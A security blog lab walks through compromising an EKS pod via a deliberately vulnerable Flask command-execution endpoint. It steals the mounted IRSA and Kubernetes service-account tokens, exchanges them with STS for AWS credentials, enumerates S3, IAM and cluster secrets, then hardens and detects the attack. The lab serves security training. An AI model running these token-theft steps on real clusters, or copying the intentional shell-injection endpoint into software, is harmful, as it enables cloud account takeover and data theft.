---
layout: post
title: "Lab — Kubernetes Pod Escape and IRSA Abuse: From Container to AWS Account"
date: 2026-06-28T10:00:00
categories:
  - AWS Security Labs
  - Kubernetes lab
tags:
  - aws
  - kubernetes
  - eks
  - irsa
  - pod-escape
  - rbac
  - guardduty
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab demonstrating how to escape a Kubernetes pod, steal the service account token, abuse IRSA to call AWS APIs, and escalate from a container to full AWS account access — then harden with RBAC, network policy, and scoped IRSA roles.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Start inside a Kubernetes pod with a misconfigured service account.
Steal the mounted service account token.
Use IRSA (IAM Roles for Service Accounts) abuse to call AWS APIs outside the cluster.
Escalate to AWS account access and enumerate S3, IAM, and other services.
Then harden the cluster so none of it is possible.

**Run this only on an EKS cluster you own.**

---

## Why Kubernetes Is a Cloud Attack Surface

Most engineers think of Kubernetes security as a container problem.
It is an AWS account problem.

Every pod in EKS can be granted an IAM role via IRSA.
The IAM credentials are delivered as a projected service account token mounted inside the pod at `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`.
If the pod is compromised — via a vulnerable application, a misconfigured admission controller, or a supply chain issue — the attacker has AWS credentials.

The difference from EC2 IMDS: there is no IMDSv2 equivalent for Kubernetes.
If the token is mounted, it is readable by any process in the pod.

---

## Attack Chain

```
Compromised pod (vulnerable application)
    │
    │  Step 1: Read the mounted IRSA token
    │  Step 2: Exchange token for AWS credentials via STS
    ▼
AWS STS → temporary credentials for the pod's IAM role
    │
    │  Step 3: Enumerate AWS services with stolen credentials
    │  Step 4: Pivot to other pods via Kubernetes API
    ▼
Lateral movement within cluster + AWS account access
```

---

## Lab Architecture

```
EKS Cluster: lab-cluster
    │
    ├── Namespace: production
    │   ├── Pod: web-app (vulnerable Flask app)
    │   │   └── ServiceAccount: web-app-sa (has IRSA role with S3FullAccess)
    │   └── Pod: database (PostgreSQL)
    │
    ├── Namespace: kube-system
    │   └── (cluster admin resources)
    │
    └── IRSA Role: eks-web-app-role (S3FullAccess + IAMReadOnlyAccess)
```

---

## Phase 0 — Setup

### Step 0.1 — Create an EKS Cluster

```bash
# Using eksctl — simplest way to get a cluster
eksctl create cluster \
  --name lab-cluster \
  --region eu-west-1 \
  --nodegroup-name lab-nodes \
  --node-type t3.medium \
  --nodes 2 \
  --managed

# Verify cluster is running
kubectl get nodes
```

> 📸 **SCREENSHOT:** `kubectl get nodes` showing 2 nodes in Ready state

### Step 0.2 — Enable IRSA on the Cluster

```bash
# Create the IAM OIDC provider for the cluster
eksctl utils associate-iam-oidc-provider \
  --cluster lab-cluster \
  --region eu-west-1 \
  --approve

# Get the OIDC issuer URL
aws eks describe-cluster \
  --name lab-cluster \
  --query "cluster.identity.oidc.issuer" \
  --output text
# e.g. https://oidc.eks.eu-west-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B716D3041E
```

### Step 0.3 — Create the Overprivileged IRSA Role

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
OIDC_ID=$(aws eks describe-cluster --name lab-cluster \
  --query "cluster.identity.oidc.issuer" --output text | cut -d'/' -f5)

cat > irsa-trust.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::${ACCOUNT_ID}:oidc-provider/oidc.eks.eu-west-1.amazonaws.com/id/${OIDC_ID}"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "oidc.eks.eu-west-1.amazonaws.com/id/${OIDC_ID}:sub":
          "system:serviceaccount:production:web-app-sa",
        "oidc.eks.eu-west-1.amazonaws.com/id/${OIDC_ID}:aud":
          "sts.amazonaws.com"
      }
    }
  }]
}
EOF

aws iam create-role \
  --role-name eks-web-app-role \
  --assume-role-policy-document file://irsa-trust.json

# Overprivileged — real world misconfiguration
aws iam attach-role-policy \
  --role-name eks-web-app-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess

aws iam attach-role-policy \
  --role-name eks-web-app-role \
  --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess
```

### Step 0.4 — Deploy the Vulnerable Application

```yaml
# vulnerable-app.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::ACCOUNT_ID:role/eks-web-app-role
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  namespace: production
spec:
  replicas: 1
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      serviceAccountName: web-app-sa
      containers:
        - name: web-app
          image: python:3.11-slim
          command: ["/bin/sh", "-c"]
          args:
            - |
              pip install flask requests -q
              python3 -c "
              from flask import Flask, request
              import subprocess, os
              app = Flask(__name__)

              # VULNERABLE: command execution endpoint
              @app.route('/run')
              def run():
                  cmd = request.args.get('cmd', 'id')
                  result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                  return result.stdout + result.stderr

              app.run(host='0.0.0.0', port=8080)
              "
          ports:
            - containerPort: 8080
          # MISCONFIGURATION: automountServiceAccountToken defaults to true
---
apiVersion: v1
kind: Service
metadata:
  name: web-app-svc
  namespace: production
spec:
  selector:
    app: web-app
  ports:
    - port: 8080
      targetPort: 8080
  type: LoadBalancer
```

```bash
kubectl apply -f vulnerable-app.yaml

# Wait for LoadBalancer IP
kubectl get svc web-app-svc -n production --watch

# Verify the app runs
APP_IP=$(kubectl get svc web-app-svc -n production -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
curl "http://$APP_IP:8080/run?cmd=id"
# Returns: uid=0(root) gid=0(root) groups=0(root)
```

> 📸 **SCREENSHOT:** `kubectl get pods -n production` showing the web-app pod Running, and curl returning `uid=0(root)`

---

## Phase 1 — Exploit the Vulnerable Application

The `/run` endpoint executes arbitrary commands.
This simulates RCE from a vulnerable web application — unpatched framework, injection vulnerability, or deserialization flaw.

```bash
# Confirm command execution
curl "http://$APP_IP:8080/run?cmd=hostname"
# Returns: web-app-7d9f8b-xk2p4

curl "http://$APP_IP:8080/run?cmd=whoami"
# Returns: root  (running as root — another misconfiguration)

# Check the environment
curl "http://$APP_IP:8080/run?cmd=env"
```

> 📸 **SCREENSHOT:** curl output showing environment variables — note AWS_WEB_IDENTITY_TOKEN_FILE and AWS_ROLE_ARN are visible

---

## Phase 2 — Read the IRSA Token

IRSA credentials are delivered differently from EC2 IMDS.
Instead of an HTTP endpoint, they are mounted as files inside the pod.

```bash
# List the token mount location
curl "http://$APP_IP:8080/run?cmd=ls+/var/run/secrets/eks.amazonaws.com/serviceaccount/"
# Returns: token

# Read the IRSA token — a JWT
curl "http://$APP_IP:8080/run?cmd=cat+/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
```

Output — a long JWT string:

```
eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzUyMTUyNjU3...
```

Also read the Kubernetes service account token (separate from IRSA):

```bash
curl "http://$APP_IP:8080/run?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token"
```

This second token is used to call the Kubernetes API — useful for lateral movement within the cluster.

> 📸 **SCREENSHOT:** The IRSA JWT token read from the pod — highlight that it is a real AWS credential exchange token

### Decode the JWT to Understand Its Claims

```bash
# Decode the JWT payload (base64 — middle section between the dots)
TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9.eyJhdWQi..."
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Output:

```json
{
  "aud": ["sts.amazonaws.com"],
  "exp": 1752152657,
  "iat": 1752149057,
  "iss": "https://oidc.eks.eu-west-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B716D3041E",
  "kubernetes.io": {
    "namespace": "production",
    "serviceaccount": {
      "name": "web-app-sa",
      "uid": "abc123..."
    }
  },
  "sub": "system:serviceaccount:production:web-app-sa"
}
```

The `sub` claim identifies the service account.
AWS STS validates this against the IRSA trust policy and issues credentials if it matches.

---

## Phase 3 — Exchange Token for AWS Credentials

Copy the token to your attacker machine and call STS directly:

```bash
# On attacker machine — exchange the IRSA token for AWS credentials
IRSA_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9..."
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/eks-web-app-role"

aws sts assume-role-with-web-identity \
  --role-arn $ROLE_ARN \
  --role-session-name stolen-irsa-session \
  --web-identity-token $IRSA_TOKEN
```

Output — full AWS credentials:

```json
{
  "Credentials": {
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "SessionToken": "AQoDYXdzEJr...",
    "Expiration": "2026-06-28T14:00:00Z"
  },
  "AssumedRoleUser": {
    "Arn": "arn:aws:sts::ACCOUNT_ID:assumed-role/eks-web-app-role/stolen-irsa-session"
  }
}
```

```bash
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoDYXdzEJr...

# Enumerate S3
aws s3 ls
aws s3 ls s3://production-bucket --recursive

# Enumerate IAM
aws iam list-users
aws iam list-roles
```

> 📸 **SCREENSHOT:** `aws sts assume-role-with-web-identity` returning credentials, then `aws s3 ls` listing production buckets

**GuardDuty finding:**

```
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
```

The IRSA credentials are being used from an IP that is not within the EKS cluster's node IP range.

---

## Phase 4 — Lateral Movement Within the Cluster

The Kubernetes service account token (different from the IRSA token) lets you call the Kubernetes API.

```bash
# Read the k8s service account token
K8S_TOKEN=$(curl "http://$APP_IP:8080/run?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token")

# Get the API server address
API_SERVER=$(curl "http://$APP_IP:8080/run?cmd=echo+\$KUBERNETES_SERVICE_HOST")

# Call the Kubernetes API — list all pods in the namespace
curl -s -k \
  -H "Authorization: Bearer $K8S_TOKEN" \
  "https://$API_SERVER/api/v1/namespaces/production/pods"
```

If the service account has excessive RBAC permissions (common misconfiguration), the attacker can:

```bash
# List secrets in the namespace (may contain DB passwords, API keys)
curl -s -k \
  -H "Authorization: Bearer $K8S_TOKEN" \
  "https://$API_SERVER/api/v1/namespaces/production/secrets"

# Exec into another pod
curl -s -k \
  -H "Authorization: Bearer $K8S_TOKEN" \
  "https://$API_SERVER/api/v1/namespaces/production/pods/database-pod/exec?command=env"
```

> 📸 **SCREENSHOT:** Kubernetes API response showing pods and secrets readable via the stolen service account token

---

## Phase 5 — Hardening

### Fix 1 — Disable Automatic Service Account Token Mounting

If the application does not need to call the Kubernetes API, disable the auto-mount entirely:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::ACCOUNT_ID:role/eks-web-app-role
automountServiceAccountToken: false  # Disable k8s API token
---
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      automountServiceAccountToken: false  # Also set at pod level
      serviceAccountName: web-app-sa
```

IRSA tokens are mounted separately by the EKS pod identity webhook — disabling `automountServiceAccountToken` removes the Kubernetes API token but keeps the IRSA token.
To remove IRSA as well, do not annotate the service account with the role ARN.

---

### Fix 2 — Run as Non-Root

```yaml
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
  containers:
    - name: web-app
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
```

Running as root inside the container made the RCE immediately useful.
Non-root with dropped capabilities limits what the attacker can do even after getting code execution.

---

### Fix 3 — Scope the IRSA Role to Least Privilege

Replace `AmazonS3FullAccess` with a scoped policy:

```bash
cat > web-app-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::production-uploads/web-app/*"
  }]
}
EOF

aws iam create-policy \
  --policy-name web-app-s3-policy \
  --policy-document file://web-app-policy.json

aws iam detach-role-policy \
  --role-name eks-web-app-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess

aws iam attach-role-policy \
  --role-name eks-web-app-role \
  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/web-app-s3-policy
```

Remove `IAMReadOnlyAccess` entirely — a web app has no reason to enumerate IAM.

---

### Fix 4 — Network Policy to Block Unexpected Egress

Block all egress except what the app needs:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: web-app-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: web-app
  policyTypes:
    - Egress
  egress:
    # Allow DNS
    - ports:
        - port: 53
          protocol: UDP
    # Allow HTTPS to AWS services (STS, S3)
    - ports:
        - port: 443
          protocol: TCP
    # Allow database connection
    - to:
        - podSelector:
            matchLabels:
              app: database
      ports:
        - port: 5432
    # Block everything else — including reverse shells on port 4444
```

This does not prevent IRSA token theft — but it prevents the attacker from using the pod as a reverse shell callback or exfiltrating data to arbitrary endpoints.

---

### Fix 5 — Enable GuardDuty EKS Protection

GuardDuty has a dedicated EKS audit log monitoring feature:

```bash
aws guardduty update-detector \
  --detector-id YOUR_DETECTOR_ID \
  --features '[{
    "Name": "EKS_AUDIT_LOGS",
    "Status": "ENABLED"
  }]'
```

With EKS protection enabled, GuardDuty fires on:

| Behavior | Finding |
|----------|---------|
| Pod trying to read secrets | `CredentialAccess:Kubernetes/MaliciousIPCaller` |
| Unusual API server calls | `Discovery:Kubernetes/KubernetesAPICalledFromProxyAddress` |
| Privilege escalation in cluster | `PrivilegeEscalation:Kubernetes/PrivilegedContainer` |
| Exec into pod from unexpected source | `Execution:Kubernetes/ExecInKubeSystemPod` |

> 📸 **SCREENSHOT:** GuardDuty → EKS protection enabled, showing Kubernetes findings in the findings list

---

## Key Takeaways

- IRSA tokens are mounted as files — any process with file read access inside the pod can steal them
- The token exchange with STS happens outside the cluster — GuardDuty detects the credentials being used from an unexpected IP
- Disabling `automountServiceAccountToken` removes the Kubernetes API lateral movement vector — but IRSA tokens are separate and controlled by pod annotations
- Least privilege on the IAM role is the most impactful defense — a stolen token for a role with only `s3:GetObject` on one prefix causes far less damage than `S3FullAccess`
- Run containers as non-root with read-only filesystems — limits what an attacker can do after RCE, and makes IRSA token files harder to read without explicit file read capabilities

---

## Cleanup

```bash
kubectl delete namespace production
eksctl delete cluster --name lab-cluster --region eu-west-1

aws iam detach-role-policy \
  --role-name eks-web-app-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess
aws iam detach-role-policy \
  --role-name eks-web-app-role \
  --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess
aws iam delete-role --role-name eks-web-app-role
```

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
